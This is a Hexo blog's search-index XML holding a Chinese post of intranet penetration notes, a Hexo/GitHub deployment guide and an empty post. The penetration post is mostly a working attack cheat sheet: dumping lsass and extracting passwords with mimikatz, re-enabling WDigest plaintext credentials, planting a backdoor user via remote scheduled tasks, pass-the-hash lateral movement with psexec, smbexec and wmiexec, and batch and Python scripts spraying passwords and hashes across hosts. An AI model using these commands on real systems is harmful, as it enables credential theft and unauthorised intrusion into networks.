<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网渗透</title>
      <link href="/2022/05/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2022/05/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><ul><li><p>工作组</p></li><li><p>域环境</p><ul><li><p>域控制器DC</p></li><li><p>活动目录AD（功能策略）</p></li></ul></li></ul><h1 id="域环境："><a href="#域环境：" class="headerlink" title="域环境："></a>域环境：</h1><ul><li>单域</li><li>父域</li><li>子域</li><li>域数</li><li>域森林</li><li>Linux域环境：LDAP</li></ul><h1 id="内网渗透流程"><a href="#内网渗透流程" class="headerlink" title="内网渗透流程"></a>内网渗透流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>收集：存活主机 域控制器 网络架构 服务接口 判断网络等信息</p><ul><li><p>判断域控（三种方法）：</p><pre><code>ipconfig /all -dnsnet view /domainnet time /domain</code></pre></li><li><p>收集用户和用户信息</p><pre><code>domain admins 域管理员（控制权）domain computers 域内机器domain controllers 域控制器domain guest 域访客（低权限）domain users 域用户enterprise admins 企业系统管理员用户（对域控有控制权）</code></pre></li><li><p>收集凭据信息：密文，明文，口令等</p><pre><code>计算机用户Hash 明文获取：mimikatz(win),mimipenguin(linux)计算机各种协议服务口令获取：lazagne(all),xenarmor(win)Wi-Fi信息：netsh wlan show profilesnetsh wlan show profile name=&quot;wifiname&quot; key=clear源码，备份文件，web管理入口，浏览器保持的密码，浏览器cookies,用户会话：3389 ipc$，回收站内容win保存的WiFi密码，网络内部的账号密码：Email VPN ftp oa ...</code></pre></li><li><p>域控架构探测</p><pre><code>域控制名：net time /domain nslookup ping域内存活主机(批量脚本)：for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.2.%I | findstr &quot;TTL=&quot;工具：nmap masscan Powershell---Nishang工具 empire ...</code></pre></li></ul><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="横向渗透-域环境下（重点）"><a href="#横向渗透-域环境下（重点）" class="headerlink" title="横向渗透 - 域环境下（重点）"></a>横向渗透 - 域环境下（重点）</h2><h3 id="传递（明文-amp-Hash）"><a href="#传递（明文-amp-Hash）" class="headerlink" title="传递（明文&amp;Hash）"></a>传递（明文&amp;Hash）</h3><ol><li>加密方式</li></ol><ul><li>windows系统<code>LM hash</code>及<code>NTLM hash</code>加密算法，个人系统在windows vista后，服务器系统在windows 2003以后，认证方式均为<code>NTLM Hash</code>。</li></ul><ol start="2"><li>at&amp;schtasks</li></ol><ul><li><p>at</p><pre><code>at &lt; windows2012建立ipc$复制文件到目标机C盘：copy add.bat \\ip\c$添加计划任务：at \ip 时间(00:00) c:\add.bat#添加用户add.bat &gt; &quot;net user ceshi 12345 /add&quot;</code></pre></li><li><p>schtasks</p><pre><code>schtasks &gt;= Windows2012建立ipc$复制文件到目标机C盘：copy add.bat \\ip\c$创建adduser任务对应执行文件：schtasks /create /s ip /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat运行adduser任务：schtasks /run /s ip /tn adduser /i删除adduser任务：schtasks /delete /s ip /tn adduser /f</code></pre></li><li><p>atexec-impacket：Hash传递</p><pre><code>atexec.exe ./username:password@ip &quot;whoami&quot;atexec.exe domain/username:password@ip &quot;whoami&quot;atexec.exe -hashes :hash ./username@ip &quot;whoami&quot;</code></pre></li></ul><ol start="2"><li>smb&amp;wmi</li></ol><ul><li><p>psexec&amp;smbexec</p><pre><code># Windows2012以上版本默认关闭wdigest，无法从内存中获取明文密码# Windows2012一下版本安装KB2871997补丁，无法从内存中获取明文密码解决方法：1. 利用hash传递（pth,ptk等）进行移动2. 利用其他服务协议（smb,wmi等）进行hash移动3. 利用注册表操作开启wdigest auth值进行获取HKLM\SYSTEM\CurrentControlSet \Control\SecurityProviders\WDigest /v \ UseLogonCredential /t REG_DWORD /d 1 /f4. 利用工具或第三方平台（hachcat）进行破解获取</code></pre></li><li><p>Procdump(官方自带)+Mimikatz配合获取</p><pre><code>procdump -accepteula -ma lsass.exe lsass.dmpmimikatz上执行:sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full#Pwdump7#QuarksPwdump```</code></pre></li><li><p>Hashcat破解获取Windows NTML Hash</p><pre><code>hashcat -a 0 -m 1000 hash file --force</code></pre></li><li><p>SMB服务利用-psexec,smbexec（官方自带）</p><pre><code>利用sMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。#psexec第一种：先有ipc链接，psexec需要明文或hash传递net use \\192.168.3.32\ipc$ &quot;password&quot; /user:usernamepsexec \\192.168.3.32 -s cmd#需要先有ipc链接 -s以system权限运行#psexec第二种:不 用建立IPC直接提供明文账户密码psexec \192.168.3.21 -u username -p password -s cmdpsexec -hashes :$HASH$ ./username@ippsexec -hashes :$HASH$ domain/username@ippsexec -hashes :hash ./username@ip # 官方pstools无法采用hash连接#非官方自带-参考impacket工具包使用,操作简单,容易被杀</code></pre><pre><code>#smbexec无需先ipc链接明文或nash传递smbexec domain/username:password@ipsmbexec ./username:password@ipsmbexec -hashes :$HASH$ ./username@ipsmbbexec -hashes :$HASH$ domain/ username@ipsmbexec -hashes :hash ./username@ipsmbexec -hashes :hash domain/username@ip</code></pre></li><li><p>WMI服务利用-cscript,wmie xec,wmic</p><pre><code>#WMI (windows Management Instrumentation)是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。#自带wMIc明文传递无回显wmic /node:ip /user:username /password:password process call create &quot; cmd.exe /c ipconfig &gt;C:\1.txt&quot;#自带cscript明文传递有回显cscript //nologo wmiexec.vbs /shell ip username password#套件impacket wmiexec 明文或hash传递 有回显exe版本wmiexec ./username:password@ip &quot;whoami&quot;wmiexec domain/username:password@ip &quot;whoami&quot;wmiexec -hashes :hash ./username@ip &quot;whoami&quot;wmiexec -hashes :hash domain/username@ip &quot;whoami&quot;</code></pre></li></ul><ol start="3"><li>CMD脚本批量利用<br>  &#96;&#96;&#96;<br>  批量检测IP对应明文连接：<br>  FOR &#x2F;F %%i in (ips.txt) do net use \%%i\ipc$ “password” &#x2F;user:username</li></ol><p>  批量检测IP对应明文回显版:<br>  FOR &#x2F;F %%i in (ips.txt) do atexec.exe .&#x2F;username:password@%%i whoami</p><p>  批量检测明文对应IP回显版:<br>  FOR &#x2F;F %%i in (pass.txt) do atexec.exe .&#x2F;username:%%i@ip whoami</p><p>  批量检测Hash对应IP回显版:<br>  FOR &#x2F;F %%i in (hash.txt) do atexec.exe -hashes :%%i .&#x2F;username@ip whoami</p><pre><code>4. Python脚本批量利用```python#用户，密码，Hash批量撞库#生产EXE：pyinstaller -F 1.pyimport os,timeips=&#123;&#39;192.168.3.21&#39;,&#39;192.168.3.32&#39;&#125;users=&#123;&#39;Administrator&#39;,&#39;webadmin&#39;&#125;hashs=&#123;&#39;ccef208c6485269c20db2cad21734fe7&#39;,&#39;518b98ad4178a53695dc997aa02d455c&#39;&#125;for ip in ips:  for user in users:    for mimahash in hashs:      exec = &quot;wmiexec -hashes :&quot;+mimaHash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;      exec1 = &quot;wmiexec -hashes :&quot;+mimaHash+&quot; ./&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;      print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)      print(&#39;---&gt;&#39; + exec1 + &#39;&lt;---&#39;)      os.system(exec)      os.system(exec1)      time.sleep(0.5)</code></pre><ol start="5"><li><p>工具优缺点<br>  &#96;&#96;&#96;</p></li><li><p>通过官方PSTools中psexec连接时只能用明文密码进行连接，但是不会被杀毒软件拦截</p></li><li><p>通过官方自带命令WMIC时，只支持明文且没有回显需自己读取</p></li><li><p>通过官方自带命令cscript与wmiexec.vbs配合时有回显，但是只支持明文</p></li><li><p>通过非官方impacket-examples-windows中psexec和smbexec和wmiexec连接时可支持密文hash密码连接，但容易被杀毒软件拦截</p></li><li><p>现在基本通过mimikatz获取的密码都是密文的</p><pre><code></code></pre></li><li><p>PTH&amp;PTT&amp;PTK</p></li><li><p>winrs&amp;</p></li></ol><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h1 id="资源工具"><a href="#资源工具" class="headerlink" title="资源工具"></a>资源工具</h1><pre><code>https://lgithub.com/hashcat/hashcathttps://www.freebuf.com/sectool/164507.htmlhttps://github.com/gentilkiwi/mimikatz/releaseshttps://github.com/SecureAuthCorp/impackethttps://gitee.com/RichChigga/impacket-examples-windowshttps://docs.microsoft.com/zh-cn/sysinternals/downloads/pstoolshttps://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</code></pre><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><pre><code>收集密码，hash探活ip收集域用户</code></pre>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo部署和GitHub推送</title>
      <link href="/2022/05/28/Hexo%E9%83%A8%E7%BD%B2%E5%92%8CGitHub%E6%8E%A8%E9%80%81/"/>
      <url>/2022/05/28/Hexo%E9%83%A8%E7%BD%B2%E5%92%8CGitHub%E6%8E%A8%E9%80%81/</url>
      
        <content type="html"><![CDATA[<h1 id="部署hexo"><a href="#部署hexo" class="headerlink" title="部署hexo"></a>部署hexo</h1><p>安装git</p><p>安装node.js</p><p>安装hexo：</p><pre><code class="bash">npm install -g hexo-clihexo init 安装目录cd 安装目录npm install</code></pre><h1 id="配置-config-yml文件"><a href="#配置-config-yml文件" class="headerlink" title="配置_config.yml文件"></a>配置_config.yml文件</h1><pre><code class="bash">deploy:  type: git  repo: https://github.com/name/name.github.io.git # GitHub仓库  branch: main # 分支  message: 123 # 自定义此次部署更新的说明,可不写</code></pre><h1 id="GitHub推送部署"><a href="#GitHub推送部署" class="headerlink" title="GitHub推送部署"></a>GitHub推送部署</h1><p>生成密钥</p><pre><code class="bash">git config --global user.email &quot;@qq.com&quot;git config --global user.name &quot;name&quot;ssh-keygen -t rsa -C &quot;@qq.com&quot;#复制生成的id_rsa.pub文件到GitHub</code></pre><h1 id="开始推送"><a href="#开始推送" class="headerlink" title="开始推送"></a>开始推送</h1><pre><code class="bash">#安装插件npm install hexo-deployer-git#初始化 git 仓库git init#推送hexo d # hexo deploy的缩写</code></pre><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>GitHub被墙</p><pre><code class="bash">自己的梯子在本地的代理地址及端口号，一般为127.0.0.1:xxxx；关闭各种国产杀毒、清理软件，启动梯子；打开终端，依次输入：git config --global http.proxy http://127.0.0.1:xxxxgit config --global https.proxy https://127.0.0.1:xxxxhexo d 即可部署；最后取消代理，依次输入：git config --global --unset http.proxygit config --global --unset https.proxy</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客重构</title>
      <link href="/2022/05/28/%E5%8D%9A%E5%AE%A2%E9%87%8D%E6%9E%84/"/>
      <url>/2022/05/28/%E5%8D%9A%E5%AE%A2%E9%87%8D%E6%9E%84/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
